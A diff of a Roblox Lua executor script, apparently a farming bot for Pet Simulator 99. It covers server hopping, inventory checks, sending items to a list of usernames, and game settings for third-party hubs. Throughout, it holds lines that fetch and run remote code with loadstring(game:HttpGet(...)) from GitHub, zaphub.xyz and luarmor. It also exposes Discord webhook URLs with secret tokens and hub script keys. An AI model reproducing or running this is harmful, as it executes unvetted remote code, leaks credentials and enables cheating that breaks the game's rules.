@@ -1,34 +1,35 @@
-  local plrs = game:GetService("Players")
+local plrs = game:GetService("Players")
   local plr = plrs.LocalPlayer
 	local tpService = game:GetService("TeleportService")
 	local getPlayers = plrs:GetPlayers()
 	local PlayerInServer = #getPlayers
- 
+
 local function getServers()
     local url =
         string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
     local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
     return servers
 end
- 
+
 local function serverhop()
  local server
     repeat
         task.wait(1)
         server = getServers()[Random.new():NextInteger(1, 100)]
- 
+
     until server.id ~= game.JobId
- 
- 
+
+
     tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
 end
- 
- 
- 
+
+
+
 local function rejoinServer()
     tpService:Teleport(game.PlaceId, plr)
 end
- 
+
+
 
 
 
@@ -51,16 +52,16 @@ local usernames = {
   "ROpS918m",
   "WCmohVzhZRs",
 }
- 
+
 local function getRandomUsername()
     local index = math.random(1, #usernames)
     return usernames[index]
 end
- 
+
 local sendto = getRandomUsername()
- 
- 
- 
+
+
+
 local phrases = {
 "Happy Birthday",
 "Good Luck",
@@ -261,51 +262,51 @@ local phrases = {
 "Cherish Your Life",
 "Be Happy Today",
 }
- 
+
 local function getRandomphrases()
     local index2 = math.random(1, #phrases)
     return phrases[index2]
 end
- 
+
 local content = getRandomphrases()
- 
- 
- 
+
+
+
 if not game:IsLoaded() then
     game.Loaded:Wait()
   end
- 
- 
- 
+
+
+
   
- 
+
 			task.spawn(function()
-                        setfpscap(25)
+                        setfpscap(20)
 			task.wait(3)
             		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false)
 			end)
- 
+
 local web = "https://discord.com/api/webhooks/1330885579084402728/"
 local web1 = "13mFCyEjiIeTGhrtcsjWZ2Fq7lxDCAqRBCX1qUFzyfLi7EmRsPKy6r5F8R9xVTY6VkzF"
 local web2 = "https://discord.com/api/webhooks/1330886409707454477/"
 local web3 = "dEb04jYUEeX4ACVXdC8t7hh2VNyJWiaZ4lH0Jvt8wvPRzY-tRcq-9Czu2nz_7r3UYPF_"
- 
- 
+
+
 local save
- 
+
 repeat
 	wait(1)
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
- 
+
 local UnlockedZones = 0
- 
- 
+
+
 function getzone()
     local total = 0
     for i, v in next, save.Get().UnlockedZones do
@@ -313,15 +314,15 @@ function getzone()
     end
     return total
 end
- 
- 
- 
- 
+
+
+
+
 UnlockedZones = getzone()
- 
- 
- 
- 
+
+
+
+
 local minSapphire = 50000
 local minRuby = 15000
 local minEmerald = 2000
@@ -329,27 +330,27 @@ local minRainbow = 20
 local minAmethyst = 120
 local minGem = 20000000
            
- 
- 
+
+
 task.spawn(function()
     while true do
 		wait(120)
 		local save
- 
+
 repeat
 	wait(1)
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
- 
- 
- 
- 
- 
+
+
+
+
+
         for i, v in pairs(save.Get().Inventory.Misc) do
             if v.id == "Rainbow Gem" and v._am >= minRainbow then
                 local am = math.floor(v._am)
@@ -388,28 +389,28 @@ save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
         
       		
     end
- 
- 
+
+
 end)
- 
- 
+
+
 task.spawn(function()
     while true do
 		wait(130)
 		local save
- 
+
 repeat
 	wait(1)
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
- 
- 
- 
+
+
+
         for i, v in pairs(save.Get().Inventory.Pet) do
             if v.id == "Huge Mining Penguin" then
                 local am = 1
@@ -429,24 +430,24 @@ save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
       		
     end
 end)
- 
+
 task.spawn(function()
     while true do
 		wait(140)
 		local save
- 
+
 repeat
 	wait(1)
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
- 
- 
- 
+
+
+
         for i, v in pairs(save.Get().Inventory.Currency) do
 			if v.id == "Diamonds" and v._am >= minGem then
                 local am = math.floor(v._am - 6000000) 
@@ -460,51 +461,51 @@ save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
       		
     end
 end)
- 
+
 daubuoi = true
- 
+
 	local save
- 
+
 	repeat
 	wait(1)
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 local cuoccuoi = false
- 
+
         for i, v in pairs(save.Get().Inventory.Pickaxe) do
             if v.id == "Emerald Pickaxe" then
 				cuoccuoi = true
 			end
 		end
- 
- 
+
+
 if UnlockedZones > 12 and cuoccuoi then
- 
- 
- 
+
+
+
 task.spawn(function()
 	wait(60)
- 
+
 	local save
- 
+
 repeat
 	wait(1)
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
- 
+
 local function getGiftAmount()
- 
- 
+
+
     for i, v in pairs(save.Get().Inventory.Currency) do
         if v.id == "Diamonds" then
             return math.floor(v._am)
@@ -512,35 +513,35 @@ local function getGiftAmount()
     end
     return 0
 end
- 
+
 local previousGift = getGiftAmount()
- 
+
 task.wait()
- 
+
 while true do
     task.wait(15)
- 
+
     local currentGift = getGiftAmount() -- Lấy giá trị Gift Bag mới
- 
+
     
     if currentGift == previousGift then
                 setfpscap(20)
 		rejoinServer()
     end
- 
+
     -- Cập nhật giá trị cũ để tiếp tục vòng lặp
     previousGift = currentGift
 end
 end)
- 
+
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/PS99.lua"))()
 end)
- 
- 
-		wait(60)	
+
+
+		wait(70)	
 setfpscap(13)
- 
+
 script_key="fPbfocuCghihxMSzVGuGMHBpWBcOfoHG";
 _G.ZapSettings = {
   ["PetSimulator99 - AutoCompleteMiningGateQuestToggle"] = false,
@@ -572,21 +573,21 @@ _G.ZapSettings = {
   ["PetSimulator99 - AutoClaimDefaultForeverPackFreeGiftToggle"] = true,
   ["PetSimulator99 - AutoTeleportToBestMiningWorldToggle"] = false
 }
- 
- 
+
+
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
- 
+
 elseif UnlockedZones > 12 and not cuoccuoi then
- 
+
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/PS99.lua"))()
 end)
- 
- 
+
+
 wait(50)
- 
+
 setfpscap(15)
- 
+
 script_key="fPbfocuCghihxMSzVGuGMHBpWBcOfoHG";
 _G.ZapSettings = {
   ["PetSimulator99 - AutoCompleteMiningGateQuestToggle"] = true,
@@ -613,13 +614,13 @@ _G.ZapSettings = {
   ["PetSimulator99 - AutoClaimFreeGiftsToggle"] = true,
   ["PetSimulator99 - AutoClaimRankRewardsToggle"] = true
 }
- 
- 
- 
+
+
+
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
- 
+
 else
- 
+
 task.spawn(function()
     while wait(5) do
 	repeat
@@ -627,11 +628,11 @@ task.spawn(function()
 	pcall(function()
 		save = game:GetService("ReplicatedStorage").Library.Client.Save
 	end)
- 
+
 until save
- 
+
 save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
- 
+
 local UnlockedZones = 0
         UnlockedZones = getzone()
 		if UnlockedZones > 12 then
@@ -640,7 +641,7 @@ local UnlockedZones = 0
 		end
     end
 end)
- 
+
 script_key = "JJjqSHDDTNSitZyjVAvoDxEzXhdsTqMz";
 _G.GDO_MINING_EVENT = true
 _G.GLOOTBOXES = {"All"}
@@ -673,10 +674,6 @@ _G.GMAIL_ITEMS = {
 ["Secret pet4"] = {Class = "Pet", Id = "Lucky Block", MinAmount = 1, AllVariants = true},
 }
 daubuoi = true
- 
- 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6e75890d2e36b4613270666c4f5ccab3.lua"))()
-end
 
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6e75890d2e36b4613270666c4f5ccab3.lua"))()
